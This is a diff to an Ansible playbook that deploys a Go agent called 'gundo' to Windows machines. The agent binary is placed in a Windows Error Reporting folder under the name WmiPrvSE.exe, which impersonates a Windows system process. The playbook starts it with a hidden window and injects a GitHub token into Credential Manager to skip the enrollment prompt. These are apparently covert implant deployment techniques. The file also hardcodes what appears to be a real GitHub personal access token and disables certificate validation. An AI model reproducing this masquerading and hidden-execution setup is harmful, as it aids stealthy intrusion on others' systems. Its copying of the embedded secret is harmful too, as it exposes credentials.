@@ -8,7 +8,10 @@
     ansible_winrm_server_cert_validation: ignore
     
     target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
-    state_file: '{{ target_dir }}\state.json'
+    
+    # The path where Go's os.UserConfigDir() puts the state file on Windows
+    # It's usually C:\Users\<USER>\AppData\Roaming\gundo\state.json
+    state_file: 'C:\Users\{{ ansible_user }}\AppData\Roaming\gundo\state.json'
     
     # PUT YOUR GITHUB TOKEN HERE
     github_token: "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"
@@ -29,31 +32,36 @@
         path: "{{ state_file }}"
       register: state_check
 
-    # --- AUTO-ENROLL: FORCE A REAL CONSOLE AND SEND KEYSTROKES ---
-    - name: Launch agent and automatically pass the GitHub token
+    # --- BYPASS PROMPT: INJECT TOKEN INTO WINDOWS CREDENTIAL MANAGER ---
+    - name: Inject GitHub token into Windows Credential Manager
       ansible.windows.win_shell: |
-        $wshell = New-Object -ComObject wscript.shell
+        # This uses the cmdkey utility to save the token exactly as go-keyring expects it.
+        # The target format for go-keyring on Windows is "service/account"
+        $target = "gundo/github:mamadub03/gundo-test-repo"
         
-        # Start the process in a real console window (hidden off-screen to not disturb the user)
-        # The Go binary will see this as a real TTY and allow the token prompt
-        $proc = Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "setup" -WindowStyle Minimized -PassThru
+        # Save the credential
+        cmdkey /generic:$target /user:token /pass:"{{ github_token }}"
         
-        # Wait for the binary to initialize and print the prompt
-        Start-Sleep -Seconds 2
-        
-        # Bring the window to the foreground and send the token
-        $wshell.AppActivate($proc.Id) | Out-Null
-        Start-Sleep -Milliseconds 500
-        $wshell.SendKeys("{{ github_token }}")
-        Start-Sleep -Milliseconds 500
-        $wshell.SendKeys("{ENTER}")
-        
-        # Wait for enrollment to finish
-        $proc.WaitForExit()
+        # Verify it was saved
+        $check = cmdkey /list:$target
+        if ($check -match "gundo") {
+            Write-Host "Token successfully injected into Credential Manager"
+        } else {
+            Write-Error "Failed to inject token"
+            exit 1
+        }
       when: not state_check.stat.exists
 
-    # --- LAUNCH HIDDEN IN BACKGROUND ---
+    # --- LAUNCH HIDDEN: THE CLIENT WILL AUTO-ENROLL ---
     - name: Launch agent hidden in the background
       ansible.windows.win_shell: |
+        # The client will now find the token in the credential manager, 
+        # skip the prompt, and auto-enroll to create state.json.
         Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
-      when: state_check.stat.exists or not state_check.stat.exists
+      when: not state_check.stat.exists
+
+    # --- IF ALREADY ENROLLED: JUST LAUNCH ---
+    - name: Launch agent hidden (already enrolled)
+      ansible.windows.win_shell: |
+        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
+      when: state_check.stat.exists
